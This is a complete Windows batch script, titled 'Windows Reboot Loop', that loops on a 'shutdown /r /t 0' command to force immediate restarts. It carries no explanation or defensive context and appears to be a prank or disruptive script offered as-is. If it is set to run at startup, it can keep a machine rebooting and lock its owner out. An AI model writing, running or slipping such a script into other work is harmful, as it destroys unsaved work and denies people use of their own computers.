@echo off
title Windows Reboot Loop

:loop
shutdown /r /t 0
goto loop